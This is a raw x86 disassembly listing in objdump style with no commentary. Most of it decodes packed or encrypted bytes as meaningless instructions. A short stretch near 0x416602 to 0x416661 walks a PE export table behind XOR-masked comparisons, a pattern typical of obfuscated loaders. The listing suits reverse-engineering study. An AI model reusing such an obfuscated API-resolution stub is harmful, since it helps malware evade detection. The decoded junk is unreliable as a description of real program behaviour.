  41627f:	sub    DWORD PTR [ebx+0x9],0x423c0a45
  416286:	pop    esp
  416287:	push   eax
  416288:	imul   edi,DWORD PTR [ebx],0x6989cf25
  41628e:	les    esp,FWORD PTR [edi]
  416290:	in     al,dx
  416291:	dec    ebp
  416292:	mov    al,0x82
  416294:	repnz sar DWORD PTR [edx+edx*8+0x41f8c9a2],0x26
  41629d:	or     DWORD PTR [ebx+0x6],ecx
  4162a0:	fild   WORD PTR [edx]
  4162a2:	push   edx
  4162a3:	mov    ah,0x7
  4162a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4162a6:	jo     0x416243
  4162a8:	xor    DWORD PTR [edi+0x186d3697],esi
  4162ae:	mov    BYTE PTR [edx+0x4a],bh
  4162b1:	or     BYTE PTR ds:0xdd7c3ebe,ch
  4162b7:	(bad)  
  4162b8:	ss ds es cwde 
  4162bc:	rcr    BYTE PTR [ebx-0x38],1
  4162bf:	dec    edi
  4162c0:	cmp    dh,BYTE PTR [ebp+0x45]
  4162c3:	xchg   esi,eax
  4162c4:	shl    BYTE PTR [esi+0x7e],0x73
  4162c8:	sti    
  4162c9:	or     BYTE PTR [ebx],dh
  4162cb:	aas    
  4162cc:	fadd   DWORD PTR [esi+0x43117c44]
  4162d2:	dec    edi
  4162d3:	repnz pop ss
  4162d5:	fwait
  4162d6:	jmp    0x4221:0xe03cde88
  4162dd:	jp     0x416265
  4162df:	pop    esp
  4162e0:	setno  BYTE PTR [eax+0x77e1bbb0]
  4162e7:	or     BYTE PTR [ebp+0xa55e182],0x51
  4162ee:	sahf   
  4162ef:	outs   dx,DWORD PTR ds:[esi]
  4162f0:	mov    es,ebx
  4162f2:	into   
  4162f3:	push   cs
  4162f4:	dec    edi
  4162f5:	(bad)  
  4162f6:	jmp    0x7c79:0x46218619
  4162fd:	cmp    al,0xea
  4162ff:	mov    bh,0x60
  416301:	jg     0x4162f1
  416303:	rcr    DWORD PTR [ecx+eiz*8-0x22544d49],0x8a
  41630b:	mov    dh,0x3a
  41630d:	cmp    al,0x22
  41630f:	jbe    0x416319
  416311:	sub    al,0x4b
  416313:	jbe    0x4162d4
  416315:	jns    0x41636f
  416317:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416318:	adc    ebx,DWORD PTR [edx+0x67c27e62]
  41631e:	test   DWORD PTR [ebx+ebx*4-0x5d1726c4],0xe5b2ca05
  416329:	jae    0x416309
  41632b:	jmp    0x416365
  41632d:	adc    edx,DWORD PTR [ecx]
  41632f:	stos   DWORD PTR es:[edi],eax
  416330:	aad    0x8d
  416332:	mov    ds:0x95abc6d1,al
  416337:	lea    ebp,[edi+ecx*4]
  41633a:	ja     0x41639a
  41633c:	in     eax,dx
  41633d:	push   ds
  41633e:	clc    
  41633f:	mov    cl,bl
  416341:	rcl    DWORD PTR [ebx],cl
  416343:	sbb    esp,0xe6a09153
  416349:	xchg   DWORD PTR [ebp+edi*4-0x1a26fe75],edx
  416350:	dec    eax
  416351:	xor    BYTE PTR [ebx-0x5d9feb83],ah
  416357:	ret    0x1384
  41635a:	or     bl,BYTE PTR [edx-0x7f70b8e0]
  416360:	dec    ebp
  416361:	aad    0x2d
  416363:	jno    0x416366
  416365:	inc    esp
  416366:	push   edx
  416367:	jg     0x41632f
  416369:	and    BYTE PTR [edi+edx*4+0x2941988e],0x3f
  416371:	daa    
  416372:	sar    BYTE PTR [edi],1
  416374:	pop    ebp
  416375:	or     ecx,DWORD PTR [eax-0x15cbd52d]
  41637b:	test   bh,bl
  41637d:	mov    cs,WORD PTR [edi+0x6e953225]
  416383:	xchg   ebp,eax
  416384:	lods   eax,DWORD PTR ds:[esi]
  416385:	jl     0x41632b
  416387:	loopne 0x4163de
  416389:	int    0x3f
  41638b:	sbb    esi,DWORD PTR [eax-0x6b37037c]
  416391:	mov    eax,ds:0xa6892021
  416396:	je     0x416318
  416398:	push   esi
  416399:	xchg   DWORD PTR [di+0x18],ecx
  41639d:	jmp    0x416395
  41639f:	rcl    BYTE PTR [ebx-0xa],0xa1
  4163a3:	test   eax,0x69c82c92
  4163a8:	lock sbb BYTE PTR [ecx],bl
  4163ab:	inc    esp
  4163ac:	or     DWORD PTR ds:0x8875934e,esp
  4163b2:	jmp    0xc472:0x84d3af14
  4163b9:	cld    
  4163ba:	icebp  
  4163bb:	dec    ecx
  4163bc:	stos   DWORD PTR es:[edi],eax
  4163bd:	vcvtsi2sd xmm6,xmm7,edx
  4163c1:	jl     0x416352
  4163c3:	aas    
  4163c4:	mov    ds:0x4569fe84,eax
  4163c9:	nop
  4163ca:	cmp    dl,BYTE PTR [edi-0x52]
  4163cd:	lods   al,BYTE PTR ds:[esi]
  4163ce:	inc    edx
  4163cf:	rcl    DWORD PTR [eax+0x28],1
  4163d2:	stos   DWORD PTR es:[edi],eax
  4163d3:	and    BYTE PTR [ebx-0x2f318415],ch
  4163d9:	cs inc esp
  4163db:	cmp    ch,BYTE PTR [ebp+ebx*2+0x6c]
  4163df:	xchg   esp,eax
  4163e0:	sbb    edx,ebx
  4163e2:	adc    eax,0xfb6f03c4
  4163e7:	sbb    eax,0x3cf702cc
  4163ec:	xor    al,0xe2
  4163ee:	xchg   ecx,eax
  4163ef:	cmp    al,0xe9
  4163f1:	nop
  4163f2:	mov    ch,0xb4
  4163f4:	ins    DWORD PTR es:[edi],dx
  4163f5:	push   0x446569a9
  4163fa:	fstp   TBYTE PTR [eax+ecx*1-0x60cc4a4f]
  416401:	cmp    eax,0xcb9ac307
  416406:	adc    BYTE PTR [esi+0x51],cl
  416409:	int3   
  41640a:	sub    DWORD PTR ds:0x4dbc5b99,edx
  416410:	dec    esp
  416411:	leave  
  416412:	(bad)  
  416413:	sbb    eax,0xcdb62272
  416418:	inc    edx
  416419:	lea    eax,[edx]
  41641b:	xor    al,0x5f
  41641d:	scas   eax,DWORD PTR es:[edi]
  41641e:	ja     0x416494
  416420:	or     ch,BYTE PTR [ecx]
  416422:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416423:	and    eax,0xd9b918c8
  416428:	ja     0x4163ed
  41642a:	(bad)  
  41642c:	push   ebx
  41642d:	out    dx,eax
  41642e:	ss fs stc 
  416431:	or     DWORD PTR ds:0x7e0ed9aa,ecx
  416437:	pop    ebx
  416438:	call   0xa041251a
  41643d:	and    ebp,ecx
  41643f:	jnp    0x41649e
  416441:	or     ah,al
  416443:	adc    ebx,edi
  416445:	outs   dx,BYTE PTR ds:[esi]
  416446:	jle    0x41647c
  416448:	iret   
  416449:	in     eax,0x8
  41644b:	mov    ecx,0x3f675295
  416450:	aam    0xcd
  416452:	or     al,0xa3
  416454:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  416456:	jne    0x416454
  416458:	xor    al,0x84
  41645a:	push   es
  41645b:	sub    al,0xa0
  41645d:	or     DWORD PTR [ecx],esi
  41645f:	in     al,dx
  416460:	pop    edi
  416461:	mov    eax,ds:0xd582d342
  416466:	fnclex 
  416468:	pop    esi
  416469:	imul   esi,DWORD PTR [ebx+0x19],0x7c51ba48
  416470:	cmp    ebx,DWORD PTR [esi]
  416472:	cmp    bh,cl
  416474:	mov    ebx,0x4495e12e
  416479:	pop    ecx
  41647a:	xchg   edi,eax
  41647b:	mov    bh,ch
  41647d:	pop    esi
  41647e:	xor    eax,0x6bacffde
  416483:	push   0x452bbfba
  416488:	pushf  
  416489:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  41648b:	enter  0xf66a,0xb3
  41648f:	inc    esi
  416490:	mov    dl,0x81
  416492:	retf   0x13f7
  416495:	arpl   WORD PTR [edx],si
  416497:	mov    al,ds:0x3d2af1bb
  41649c:	rcl    BYTE PTR ds:0xe6207517,0x85
  4164a3:	push   ebp
  4164a4:	or     BYTE PTR [edi+0x41],al
  4164a7:	cli    
  4164a8:	arpl   ax,bp
  4164aa:	inc    edi
  4164ab:	test   eax,0x49655ea3
  4164b0:	ror    ah,0x76
  4164b3:	popf   
  4164b4:	pop    esi
  4164b5:	int3   
  4164b6:	mov    WORD PTR [ecx-0x1c1ad3e7],ds
  4164bc:	js     0x416489
  4164be:	mov    BYTE PTR [edi+0x4],cl
  4164c1:	pop    edi
  4164c2:	jne    0x41646a
  4164c4:	push   0xa3b2312b
  4164c9:	or     al,0xd9
  4164cb:	shl    BYTE PTR [edx],1
  4164cd:	jg     0x4164cd
  4164cf:	lock mov edx,0x79e45b7b
  4164d5:	retf   0x11e0
  4164d8:	mov    esp,0x6511a5bb
  4164dd:	xchg   ebx,eax
  4164de:	aad    0x4
  4164e0:	mov    ds:0xf3e29420,al
  4164e5:	clc    
  4164e6:	adc    eax,0x6e819f0
  4164eb:	push   ss
  4164ec:	or     al,0x19
  4164ee:	mov    ebp,DWORD PTR [eax+edx*4+0x16]
  4164f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4164f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164f4:	pop    ebx
  4164f5:	sbb    esp,edx
  4164f7:	mov    edx,0x6383418
  4164fc:	mov    ?,WORD PTR [edi]
  4164fe:	dec    esp
  4164ff:	push   esi
  416500:	fnstcw WORD PTR [edi+0x18]
  416503:	mov    WORD PTR [edi+eax*8+0x54],ss
  416507:	(bad)  
  416508:	push   eax
  416509:	pop    esp
  41650a:	mov    ebx,cs
  41650c:	xchg   edi,eax
  41650d:	test   BYTE PTR [ecx+0x7],dh
  416510:	mov    ds:0xdef58560,al
  416515:	in     al,0x77
  416517:	sahf   
  416518:	mov    al,ds:0x4dfed207
  41651d:	mov    eax,ds:0x17734899
  416522:	sti    
  416523:	dec    ebp
  416524:	xor    DWORD PTR [edx+0x26c1e0b7],edi
  41652a:	xor    BYTE PTR ds:0x1a739978,bl
  416530:	push   esp
  416531:	(bad)  
  416532:	scas   al,BYTE PTR es:[edi]
  416533:	or     DWORD PTR ds:0x7229053d,esp
  416539:	std    
  41653a:	ret    
  41653b:	fisub  DWORD PTR [edx]
  41653d:	(bad)  
  41653e:	retf   0x50e6
  416541:	pop    esi
  416542:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416543:	into   
  416544:	mov    esp,?
  416546:	fld    DWORD PTR [eax-0x39]
  416549:	and    eax,DWORD PTR [ebp-0x50]
  41654c:	repz sub bl,dh
  41654f:	xor    esp,edx
  416551:	xchg   edi,eax
  416552:	sahf   
  416553:	scas   eax,DWORD PTR es:[edi]
  416554:	cmp    ebx,DWORD PTR [ebx-0x258f6c57]
  41655a:	in     al,dx
  41655b:	xlat   BYTE PTR ds:[ebx]
  41655c:	mov    al,0x17
  41655e:	ficom  WORD PTR [ebp-0x56]
  416561:	bswap  ebx
  416563:	into   
  416564:	clc    
  416565:	xchg   BYTE PTR [ecx],ch
  416567:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416568:	arpl   WORD PTR [edx],ax
  41656a:	out    dx,eax
  41656b:	loope  0x4165e6
  41656d:	cmp    dl,BYTE PTR [ebx-0x6cd9f130]
  416573:	or     al,0xcf
  416575:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416576:	aaa    
  416577:	or     al,0xa7
  416579:	cmp    DWORD PTR [edx+0x732a9397],edi
  41657f:	fwait
  416580:	popa   
  416581:	ds inc edi
  416583:	xchg   edx,eax
  416584:	push   ebp
  416585:	lods   al,BYTE PTR ds:[esi]
  416586:	out    0xd1,al
  416588:	(bad)  
  41658a:	clc    
  41658b:	mov    eax,0x6c5ce7b6
  416590:	adc    DWORD PTR [ecx+0x2a8447a5],0x4f494fc8
  41659a:	pop    ebx
  41659b:	lock jns 0x4165a2
  41659e:	stc    
  41659f:	fnstenv ds:0xe77733a5
  4165a5:	jbe    0x4165fe
  4165a7:	mov    bh,bl
  4165a9:	fdivr  st(3),st
  4165ab:	fmul   DWORD PTR [esi+0x2a]
  4165ae:	cmp    eax,0xd8f88b7d
  4165b3:	jmp    0x41658c
  4165b5:	retf   
  4165b6:	push   ds
  4165b7:	inc    esi
  4165b8:	jb     0x416598
  4165ba:	nop
  4165bb:	mov    ah,0xab
  4165bd:	scas   eax,DWORD PTR es:[edi]
  4165be:	dec    edi
  4165bf:	fiadd  WORD PTR [eax+edi*1]
  4165c2:	push   esi
  4165c3:	cmp    BYTE PTR [ecx-0x7733d8f8],ch
  4165c9:	sti    
  4165ca:	pusha  
  4165cb:	dec    esp
  4165cc:	adc    BYTE PTR [edi+0x6bd9d19d],dl
  4165d2:	rcl    BYTE PTR [esi+0x75],0x3e
  4165d6:	or     al,0x66
  4165d8:	jge    0x4165d8
  4165da:	out    dx,al
  4165db:	out    0xc,eax
  4165dd:	mov    edx,cs
  4165df:	bound  esp,QWORD PTR [eax-0x5e]
  4165e2:	mov    al,0xa1
  4165e4:	pusha  
  4165e5:	sub    esp,DWORD PTR [ebp+0x55]
  4165e8:	fmul   DWORD PTR [edx+0x5b0d1b64]
  4165ee:	cmp    al,cl
  4165f0:	mov    ebp,0x6b63eba6
  4165f5:	clc    
  4165f6:	rol    BYTE PTR [ebx-0x7af0a209],0x22
  4165fd:	add    BYTE PTR [eax],al
  4165ff:	add    BYTE PTR [esi+0xf],ah
  416602:	mov    esi,0x3b4bbb38
  416607:	add    BYTE PTR [eax],al
  416609:	sub    di,bx
  41660c:	mov    ebx,0x8a85
  416611:	xor    di,bx
  416614:	mov    ebx,0x4f87
  416619:	cmp    di,bx
  41661c:	je     0x416632
  416622:	mov    edi,DWORD PTR [ebp-0x10]
  416625:	xor    edi,ecx
  416627:	mov    ebx,esi
  416629:	sub    ebx,edi
  41662b:	add    eax,ebx
  41662d:	jmp    0x41421e
  416632:	mov    esi,DWORD PTR [ebp-0x14]
  416635:	mov    esi,DWORD PTR [esi]
  416637:	mov    edi,DWORD PTR [eax+0x3c]
  41663a:	lea    esi,[edi+esi*8+0x78]
  41663e:	mov    esi,DWORD PTR [esi+eax*1]
  416641:	mov    DWORD PTR [ebp-0x8],esi
  416644:	mov    esi,DWORD PTR [ebp+0x8]
  416647:	xor    esi,ecx
  416649:	add    esi,edx
  41664b:	mov    DWORD PTR [ebp-0x14],esi
  41664e:	mov    esi,DWORD PTR [ebp+0x8]
  416651:	mov    edi,DWORD PTR [ebp-0x8]
  416654:	xor    esi,ecx
  416656:	add    esi,edx
  416658:	pop    ebx
  416659:	cmp    edi,esi
  41665b:	jne    0x41adf7
  416661:	jmp    0x418a20
  416666:	fnstenv [edx-0x73]
  416669:	xchg   ebp,eax
  41666a:	gs xchg ebp,eax
  41666c:	test   eax,0x7c0e640e
  416671:	sbb    dl,al
  416673:	cdq    
  416674:	js     0x416600
  416676:	(bad)  [ebx]
  416678:	popa   
  416679:	(bad)  
  41667a:	rcr    BYTE PTR [edi+0x62],0x62
  41667e:	inc    esp
  41667f:	out    dx,eax
  416680:	and    BYTE PTR [eax+eiz*2-0xc],dl
  416684:	cmc    
  416685:	in     al,dx
  416686:	xor    al,0x6b
  416688:	push   eax
  416689:	jg     0x416699
  41668b:	inc    eax
  41668c:	(bad)  
  41668d:	cmp    ah,BYTE PTR [edx+0x5a]
  416690:	and    ebx,DWORD PTR [ebx+0x4e5493e4]
  416696:	test   eax,0xc9599177
  41669b:	jns    0x416703
  41669d:	inc    esp
  41669e:	stos   DWORD PTR es:[edi],eax
  41669f:	pop    ds
  4166a0:	jmp    0x416686
  4166a2:	mov    WORD PTR [edx],cs
  4166a4:	dec    ecx
  4166a5:	jne    0x41663d
  4166a7:	and    BYTE PTR [eax+0x5f8d9d88],dh
  4166ad:	xchg   ebp,eax
  4166ae:	cmp    eax,0xf86053e6
  4166b3:	jmp    0x54d:0x6c8b9509
  4166ba:	add    al,0x69
  4166bc:	cmp    al,0x1a
  4166be:	and    DWORD PTR [edi+0x392383d0],ebp
  4166c4:	mov    al,0x1a
  4166c6:	outs   dx,DWORD PTR ds:[esi]
  4166c7:	sbb    eax,0x530c7505
  4166cc:	lea    ebx,[edx+eax*4]
  4166cf:	ss repnz scas eax,DWORD PTR es:[edi]
  4166d2:	pop    edi
  4166d3:	fwait
  4166d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4166d5:	imul   ebx,DWORD PTR [ebx],0xffffffc5
  4166d8:	adc    ebp,ebp
  4166da:	loop   0x416697
  4166dc:	imul   edx,DWORD PTR ds:0x49a33bd1,0x65
  4166e3:	arpl   WORD PTR [eax-0x675794a9],si
  4166e9:	int3   
  4166ea:	mov    ebx,0x8ea11c37
  4166ef:	sti    
  4166f0:	cmp    eax,0x20a124ff
  4166f5:	xor    al,0xd6
  4166f7:	add    al,0x7c
  4166f9:	sub    eax,DWORD PTR [ecx]
  4166fb:	lahf   
  4166fc:	dec    eax
  4166fd:	or     edi,DWORD PTR ds:0x66a5cec2
  416703:	popa   
  416704:	cld    
  416705:	neg    DWORD PTR [esi-0x5cf2115b]
  41670b:	add    eax,0x19d81ccb
  416710:	jle    0x416721
  416712:	or     dl,0x51
  416715:	and    eax,0x9e76231c
  41671a:	push   esp
  41671b:	test   ebp,edi
  41671d:	into   
  41671e:	add    ecx,DWORD PTR [esi-0x58]
  416721:	mov    esp,0xbd11b38e
  416726:	mov    cl,0xaf
  416728:	aas    
  416729:	jns    0x41678e
  41672b:	mov    al,ds:0xeaf97b4e
  416730:	mov    ebp,0x6753e2b7
  416735:	cmp    ebx,esi
  416737:	jle    0x4166e2
  416739:	loop   0x41670b
  41673b:	addr16 push 0x9bc9fac6
  416741:	das    
  416742:	int3   
  416743:	in     al,0x4b
  416745:	lods   al,BYTE PTR ds:[esi]
  416746:	test   BYTE PTR [eax],ch
  416748:	outs   dx,DWORD PTR ds:[esi]
  416749:	gs popf 
  41674b:	setge  bh
  41674e:	aad    0x90
  416750:	das    
  416751:	inc    edx
  416752:	pop    esp
  416753:	mov    ch,0x36
  416755:	retf   
  416756:	int    0x74
  416758:	repnz enter 0xca01,0xda
  41675d:	into   
  41675e:	es jg  0x4167c5
  416761:	and    al,0xd5
  416763:	pop    ds
  416764:	aam    0x30
  416766:	or     al,0x37
  416768:	shl    BYTE PTR [ecx-0x73],0xec
  41676c:	dec    ebx
  41676d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41676e:	push   ebp
  41676f:	popa   
  416770:	ret    0x490c
  416773:	test   DWORD PTR [edi-0x3f9eaa15],esp
  416779:	shl    DWORD PTR [esi-0x67307994],0xde
  416780:	lea    eax,[ecx-0x63]
  416783:	(bad)  
  416784:	rol    dh,cl
  416786:	call   0x6f48bf45
  41678b:	es sbb al,0x55
  41678e:	xchg   edi,eax
  41678f:	stc    
  416790:	fcomip st,st(3)
  416792:	mov    eax,0x264356a4
  416797:	pop    esp
  416798:	iret   
  416799:	(bad)  
  41679a:	pop    ebx
  41679b:	push   eax
  41679c:	addr16 jnp 0x416732
  41679f:	imul   edi,DWORD PTR [ecx+esi*4-0x17c53d3],0x3d
  4167a7:	add    al,0xe8
  4167a9:	outs   dx,DWORD PTR ds:[esi]
  4167aa:	push   edx
  4167ab:	scas   al,BYTE PTR es:[edi]
  4167ac:	xchg   esi,eax
  4167ad:	scas   al,BYTE PTR es:[edi]
  4167ae:	nop
  4167af:	sahf   
  4167b0:	mov    bh,BYTE PTR [ebp+0x4ac03685]
  4167b6:	sub    ch,0x27
  4167b9:	jnp    0x416742
  4167bb:	mov    ah,0x70
  4167bd:	bound  edi,QWORD PTR [ebp+0x7f82a3bb]
  4167c3:	and    BYTE PTR [edx+0x1a2a6f4b],0x71
  4167ca:	dec    ecx
  4167cb:	jbe    0x416812
  4167cd:	popa   
  4167ce:	iret   
  4167cf:	test   eax,0xc0a788b3
  4167d4:	sub    bh,ch
  4167d6:	sub    edx,ecx
  4167d8:	mov    DWORD PTR [eax],edx
  4167da:	add    al,0x6d
  4167dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167dd:	jg     0x4167b7
  4167df:	xchg   esp,eax
  4167e0:	push   ebx
  4167e1:	jl     0x41679f
  4167e3:	pop    edi
  4167e4:	dec    ecx
  4167e5:	daa    
  4167e6:	rcl    DWORD PTR [esp+eiz*2],cl
  4167e9:	(bad)  
  4167ea:	lods   al,BYTE PTR ds:[esi]
  4167eb:	in     al,0xcb
  4167ed:	pop    esi
  4167ee:	gs mov eax,0xbb00ef6f
  4167f4:	out    dx,al
  4167f5:	add    al,0x0
  4167f7:	arpl   WORD PTR ds:0x56c81a80,bx
  4167fd:	popf   
  4167fe:	lods   eax,DWORD PTR ds:[esi]
  4167ff:	jno    0x4167cf
  416801:	and    bp,sp
  416804:	xchg   esp,eax
  416805:	inc    edx
  416806:	ret    0x4e77
  416809:	dec    ebx
  41680a:	and    ecx,edi
  41680c:	or     edi,eax
  41680e:	sub    DWORD PTR [ebp+eax*8+0x78914b24],ebx
  416815:	mov    eax,0xec926b4d
  41681a:	ds mov dh,0x51
  41681d:	test   BYTE PTR [esp+edi*2-0x356c31ec],dl
  416824:	(bad)  
  416825:	mov    ecx,DWORD PTR [esi-0x760a0c55]
  41682b:	mov    ecx,0x5e16a94e
  416830:	pop    ss
  416831:	mov    eax,ds:0x1dc1cee6
  416836:	call   0xd8aa:0xc7479838
  41683d:	jecxz  0x416820
  41683f:	les    ebp,FWORD PTR ds:0xa6fd4e03
  416845:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416846:	arpl   WORD PTR [eax-0x3ee424],cx
  41684c:	loop   0x416891
  41684e:	std    
  41684f:	scas   al,BYTE PTR es:[edi]
  416850:	adc    esp,edx
  416852:	test   bl,bh
  416854:	fdivr  QWORD PTR [edx+0x2de0dd7a]
  41685a:	and    eax,0x288e5a4f
  41685f:	ror    DWORD PTR [edi-0x574eade5],1
  416865:	outs   dx,BYTE PTR ds:[esi]
  416866:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416867:	mov    ebx,0xe8c083e7
  41686c:	rcl    bl,1
  41686e:	fist   WORD PTR [ecx+0x54]
  416871:	add    eax,DWORD PTR [esi+0x2840078d]
  416877:	ret    0x6c2e
  41687a:	sbb    eax,0x632c1256
  41687f:	and    al,0xe4
  416881:	nop/reserved BYTE PTR [ebp+0x4e33e50e]
  416888:	lock add DWORD PTR [ecx-0x3b],0x1b0099d7
  416890:	idiv   ebx
  416892:	cmp    eax,DWORD PTR [ebp-0x889046c]
  416898:	mov    cl,al
  41689a:	inc    eax
  41689b:	imul   ebx,DWORD PTR [edx],0x5b
  41689e:	in     al,dx
  41689f:	sbb    al,0x33
  4168a1:	adc    BYTE PTR [ecx+edx*1-0x5b],0x41
  4168a6:	xor    DWORD PTR [eax],ebp
  4168a8:	jmp    0xc674:0x3d013ce2
  4168af:	inc    ebx
  4168b0:	xor    dh,BYTE PTR [esp+ecx*1-0x7a88f6a4]
  4168b7:	and    BYTE PTR [ecx+0x16],dl
  4168ba:	dec    edi
  4168bb:	push   eax
  4168bc:	lods   al,BYTE PTR ds:[esi]
  4168bd:	sbb    eax,0x13810a27
  4168c2:	pop    ebp
  4168c3:	or     eax,esi
  4168c5:	sbb    DWORD PTR [ecx],esi
  4168c7:	mov    ah,0xe4
  4168c9:	sub    DWORD PTR [esi],edx
  4168cb:	into   
  4168cc:	and    DWORD PTR [esi+0x54556be2],edx
  4168d2:	sbb    bh,BYTE PTR [edx-0x5fd0fc34]
  4168d8:	push   ecx
  4168d9:	loop   0x416909
  4168db:	or     BYTE PTR [ebx+0x13],bh
  4168de:	push   esp
  4168df:	ret    
  4168e0:	mov    eax,ds:0x2f82fdbf
  4168e5:	xor    BYTE PTR [ebp+0x6a],al
  4168e8:	cmp    esi,DWORD PTR [eax]
  4168ea:	retf   
  4168eb:	loope  0x4168e4
  4168ed:	arpl   WORD PTR [ebx+edi*4+0x1e],dx
  4168f1:	mov    ah,cl
  4168f3:	out    0x21,eax
  4168f5:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4168f7:	ins    BYTE PTR es:[edi],dx
  4168f8:	sbb    BYTE PTR [eax+0x635f6748],dl
  4168fe:	mov    al,BYTE PTR [ecx-0x58]
  416901:	pushf  
  416902:	mov    dh,0xb
  416904:	rcr    dh,cl
  416906:	push   ecx
  416907:	fild   WORD PTR [ebp-0x40d44d4f]
  41690d:	sbb    DWORD PTR [eax],esi
  41690f:	xchg   edx,eax
  416910:	push   es
  416911:	in     eax,dx
  416912:	cmp    cl,BYTE PTR [ebx]
  416914:	xor    al,0x3e
  416916:	and    DWORD PTR [eax+0x34],esp
  416919:	mov    esp,0x21b2f15
  41691e:	ror    BYTE PTR [ebx+0x66],0xd
  416922:	ins    BYTE PTR es:[edi],dx
  416923:	addr16 int 0xd
  416926:	leave  
  416927:	arpl   WORD PTR [ecx],sp
  416929:	(bad)  
  41692a:	popa   
  41692b:	xchg   ecx,eax
  41692c:	out    0x11,eax
  41692e:	add    bl,BYTE PTR [eax]
  416930:	loopne 0x41697b
  416932:	inc    ebp
  416933:	aam    0xf
  416935:	adc    al,dh
  416937:	cli    
  416938:	bound  ebp,QWORD PTR [eax]
  41693a:	jg     0x4169ae
  41693c:	jne    0x416915
  41693e:	mov    es,WORD PTR [esi+eiz*2]
  416941:	push   ds
  416942:	inc    esi
  416943:	repnz mov ebp,0xde05f1d6
  416949:	ins    DWORD PTR es:[edi],dx
  41694a:	stos   DWORD PTR es:[edi],eax
  41694b:	dec    esi
  41694c:	leave  
  41694d:	xchg   esi,eax
  41694e:	repz inc esi
  416950:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416951:	xchg   esp,eax
  416952:	mov    esi,0x7a701fd8
  416957:	test   dh,al
  416959:	mov    WORD PTR [ecx+0x41],cs
  41695c:	mov    ebp,0xc51bde84
  416961:	or     cl,BYTE PTR [eax-0x77]
  416964:	push   edx
  416965:	jle    0x41699c
  416967:	and    eax,0x875f5895
  41696c:	xor    edx,ebp
  41696e:	or     edi,esp
  416970:	add    al,0xa9
  416972:	sub    ch,BYTE PTR [ebp+0x61]
  416975:	mov    ecx,DWORD PTR [eax]
  416977:	out    dx,al
  416978:	add    ecx,DWORD PTR [ebx+ecx*2-0x23]
  41697c:	or     DWORD PTR [edx+0x78],ebp
  41697f:	push   eax
  416980:	test   eax,0xe750b53f
  416985:	adc    eax,0x7d621503
  41698a:	jbe    0x4169b9
  41698c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41698d:	cld    
  41698e:	ja     0x41698e
  416990:	pushf  
  416991:	test   BYTE PTR [edx+0x47],dh
  416994:	pop    es
  416995:	inc    ebx
  416996:	push   ebp
  416997:	dec    ebp
  416998:	lods   al,BYTE PTR ds:[esi]
  416999:	sahf   
  41699a:	popf   
  41699b:	adc    eax,0x8f915aa7
  4169a0:	push   bp
  4169a2:	dec    ecx
  4169a3:	repz fs test al,0x52
  4169a7:	bound  ecx,QWORD PTR [edi+0x48e0d6df]
  4169ad:	shr    ebp,cl
  4169af:	mov    bl,0x3
  4169b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169b2:	cli    
  4169b3:	out    0x45,al
  4169b5:	mov    bl,0x17
  4169b7:	xchg   ebp,eax
  4169b8:	xor    eax,esp
  4169ba:	push   edi
  4169bb:	scas   al,BYTE PTR es:[edi]
  4169bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169bd:	mov    ecx,0xfdfa7ce6
  4169c2:	repnz sbb BYTE PTR [ebx+0x11],0xbc
  4169c7:	pop    edx
  4169c8:	out    0x54,al
  4169ca:	push   esp
  4169cb:	dec    ebp
  4169cc:	adc    DWORD PTR [esi+0x59],esp
  4169cf:	mov    esp,0xe1f198eb
  4169d4:	push   esp
  4169d5:	out    dx,eax
  4169d6:	inc    edx
  4169d7:	test   BYTE PTR [ebx+edx*8-0x77],al
  4169db:	add    eax,esi
  4169dd:	jge    0x416a4b
  4169df:	push   ebx
  4169e0:	dec    edx
  4169e1:	sbb    DWORD PTR [ebx],ecx
  4169e3:	mov    ss,WORD PTR [edi+eiz*2+0x5]
  4169e7:	ror    bl,cl
  4169e9:	jb     0x4169d2
  4169eb:	dec    esi
  4169ec:	addr16 push edi
  4169ee:	out    0x15,eax
  4169f0:	jb     0x4169ce
  4169f2:	xchg   ebx,eax
  4169f3:	and    al,0x86
  4169f5:	leave  
  4169f6:	cwde   
  4169f7:	mov    ds,WORD PTR [ecx-0x4bf8446c]
  4169fd:	or     al,0xac
  4169ff:	push   cs
  416a00:	push   0xffffffac
  416a02:	mov    dl,BYTE PTR [edi+eiz*4]
  416a05:	push   eax
  416a06:	mov    DWORD PTR [ebx+0x42cca41b],esp
  416a0c:	dec    ebp
  416a0d:	mov    al,0x9c
  416a0f:	popf   
  416a10:	scas   eax,DWORD PTR es:[edi]
  416a11:	lock sbb esp,DWORD PTR [edx-0x7db82abd]
  416a18:	sub    bh,BYTE PTR [esp+edi*1-0x514d2108]
  416a1f:	mov    cl,0xa9
  416a21:	icebp  
  416a22:	fiadd  DWORD PTR [esi*8-0x62a8d7a1]
  416a29:	frstor [eax]
  416a2b:	sub    edx,ecx
  416a2d:	fs call 0xc48d0cb5
  416a33:	and    al,0x51
  416a36:	ror    BYTE PTR [ebx-0x37f211b7],1
  416a3c:	xchg   esi,eax
  416a3d:	stos   DWORD PTR es:[edi],eax
  416a3e:	dec    ecx
  416a3f:	and    eax,0x7d1d8a8e
  416a44:	sub    BYTE PTR [esi],0x5c
  416a47:	bound  ecx,QWORD PTR [ecx+0x24]
  416a4a:	into   
  416a4b:	pop    ss
  416a4c:	jns    0x416a74
  416a4e:	gs mov esi,0x9a479cc1
  416a54:	(bad)  
  416a55:	loopne 0x416a00
  416a57:	scas   al,BYTE PTR es:[edi]
  416a58:	sub    DWORD PTR [ebx],eax
